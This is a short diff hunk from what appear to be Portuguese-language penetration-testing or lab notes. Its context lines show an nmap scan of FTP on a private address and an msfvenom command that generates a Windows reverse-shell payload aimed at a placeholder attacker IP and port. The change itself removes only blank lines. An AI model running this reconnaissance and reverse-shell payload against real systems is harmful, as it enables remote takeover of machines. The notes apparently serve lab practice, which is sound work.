@@ -25,5 +25,3 @@ nmap -Pn -p21 -A 192.168.15.150
 Gerando payload do shell reverso
 msfvenom -p windows/shell_reverse_tcp LHOST=IP_atacante LPORT=Porta_atacante -b "\x00\x0a\x0d\x40" -a x86 -f python
 
-
-
